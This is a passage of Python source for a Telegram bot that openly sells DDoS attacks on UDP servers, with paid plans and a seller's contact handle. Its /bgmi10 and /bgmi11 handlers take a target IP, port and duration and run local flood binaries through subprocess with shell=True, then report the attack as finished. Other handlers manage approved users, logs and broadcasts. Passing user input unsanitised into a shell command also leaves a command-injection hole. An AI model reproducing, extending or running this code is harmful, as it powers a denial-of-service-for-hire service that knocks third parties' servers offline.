                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi10 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi11'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi11 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗜𝗻 𝗢𝘂𝗿 𝗕𝗼𝘁𝘀:
💢 Your_command : 𝗶𝘁'𝘀 𝘂𝘀𝗲 𝗙𝗼𝗿 𝗗𝗱𝗼𝘀. 
💢 /rules : 𝗜𝘁'𝘀 𝘂𝘀𝗲 𝗳𝗼𝗿 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗹𝗲𝘀 !!.
💢 /mylogs : 𝘂𝘀𝗲 𝗳𝗼𝗿 𝗰𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗿𝗲𝗰𝗲𝗻𝘁 𝗮𝗰𝘁𝗶𝗼𝗻𝘀.
💢 /plan : 𝗰𝗵𝗲𝗰𝗸 𝗢𝘂𝗿 𝗣𝗿𝗶𝗰𝗲𝘀 𝗼𝗳 𝗗𝗱𝗼𝘀

🤖 𝗶𝗳 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗔𝗱𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀:
💢 /admincmd : 𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗔𝗱𝗺𝗶𝗻𝘀

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help 
✅BUY :- @Fridayxd'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {user_name} 𝗧𝗼 𝗢𝘂𝗿 𝗗𝗱𝗼𝘀 𝗕𝗼𝘁.
    𝗜𝘁'𝘀 𝗔 𝗗𝗱𝗼𝘀 𝗕𝗼𝘁 𝗪𝗵𝗶𝗰𝗵 𝘄𝗼𝗿𝗸𝘀 𝗢𝗻 𝗨𝗱𝗽 𝗦𝗲𝗿𝘃𝗲𝗿𝘀
    𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗕𝘂𝘆 𝗣𝗹𝗮𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀
    𝗜𝗳 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗙𝗿𝗶𝘀𝘁 𝗧𝗶𝗺𝗲 𝗧𝗵𝗲𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 /help
    𝗗𝗺 𝗙𝗼𝗿 𝗠𝗼𝗿𝗲 𝗜𝗻𝗳𝗼 @fridayxd
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗕𝘂𝘆 𝗢𝘂𝗿 𝗔𝗻𝘆 𝗢𝗻𝗲 𝗣𝗹𝗮𝗻𝘀 𝗙𝗼𝗿 𝗙𝘂𝗰𝗸 𝗦𝗲𝗿𝘃𝗲𝗿𝘀

𝗽𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁💸 :
𝗗𝗮𝘆𝘀 :- 100
𝗪𝗲𝗲𝗸-->400
𝗠𝗼𝗻𝘁𝗵-->800
𝗗𝗺 𝗛𝗲𝗿𝗲 : @FRIDAYXD
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀!!:

💯 /add <userId> : 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿𝘀.
💢 /remove <userid> 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀.
💯 /allusers : 𝗔𝗹𝗹 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀.
💯 /logs : 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗟𝗼𝗴𝘀.
💢 /broadcast : 𝗦𝗲𝗻𝗱 𝗔𝗹𝗹 𝗠𝗮𝘀𝘀𝗮𝗴𝗲 𝗔𝘁 𝗢𝗻𝗰𝗲.
💢 /clearlogs : 𝗖𝗹𝗲𝗮𝗿 𝗔𝗹𝗹 𝗟𝗼𝗴𝘀.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


